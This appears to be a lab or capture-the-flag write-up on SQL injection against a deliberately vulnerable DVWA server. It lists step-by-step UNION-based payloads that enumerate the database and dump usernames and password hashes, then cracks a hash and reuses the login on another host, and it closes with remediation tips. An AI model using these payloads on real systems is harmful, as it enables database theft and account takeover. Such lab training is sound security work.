# Challenge 1: SQL Injection

## Objective
Exploit an SQL injection vulnerability on the DVWA server at `10.5.5.12` to retrieve Bob Smith's credentials, crack his password, and access the flag file on `192.168.0.10`.

## Step 1: Preliminary Setup
1. Open a browser and navigate to `http://10.5.5.12` (remove `https://` if needed).
2. Log in with credentials: `admin` / `password`.
3. Set DVWA security level to **Low** and click Submit.

## Step 2: Retrieve Bob Smith's Credentials
1. **Check for SQL Vulnerability**:
   - Navigate to the SQL Injection tab.
   - In the User ID field, enter: `' OR 1=1 #`
   - **Output**: Displays all user data, confirming SQL injection vulnerability.
   - Screenshot: ![SQL Vulnerability](./screenshots/image4.png)

2. **Determine Number of Fields**:
   - Enter: `1' ORDER BY 1 #` (works)
   - Enter: `1' ORDER BY 2 #` (works)
   - Enter: `1' ORDER BY 3 #` (returns error, indicating 2 columns).
   - Screenshot: ![Field Count](./screenshots/image2.png)

3. **Check DBMS Version**:
   - Enter: `1' OR 1=1 UNION SELECT 1,VERSION() #`
   - **Output**: MySQL version 5.5.58.
   - Screenshot: ![DBMS Version](./screenshots/image5.png)

4. **Get Database Name**:
   - Enter: `1' OR 1=1 UNION SELECT 1,DATABASE() #`
   - **Output**: Database name is `dvwa`.
   - Screenshot: ![Database Name](./screenshots/image10.png)

5. **Retrieve Table Names**:
   - Enter: `1' OR 1=1 UNION SELECT 1,TABLE_NAME FROM information_schema.tables WHERE table_schema='dvwa' #`
   - **Output**: Tables `guestbook` and `users`.
   - Screenshot: ![Table Names](./screenshots/image8.png)

6. **Retrieve Column Names**:
   - Enter: `1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' #`
   - **Output**: Columns `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`, `last_login`, `failed_login`.
   - Screenshot: ![Column Names](./screenshots/image3.png)

7. **Retrieve Credentials**:
   - Enter: `1' OR 1=1 UNION SELECT user,password FROM users #`
   - **Output**: Retrieved username `smithy` and password hash for Bob Smith.
   - Screenshot: ![Credentials](./screenshots/image11.png)

## Step 3: Crack Bob Smith’s Password
- Use CrackStation to crack the password hash.
- **Result**: Password for `smithy` (Bob Smith) is `password`.
- Screenshot: ![Cracked Password](./screenshots/image9.png)

## Step 4: Access the Flag File
1. Log into `192.168.0.10` using `smithy` / `password`.
2. Locate and open the flag file in Bob Smith’s home directory.
- Screenshot: ![Flag File](./screenshots/image1.png)

## Remediation
- Use prepared statements to sanitize inputs.
- Set DVWA security to high to prevent SQL injection.
- Restrict database user permissions.
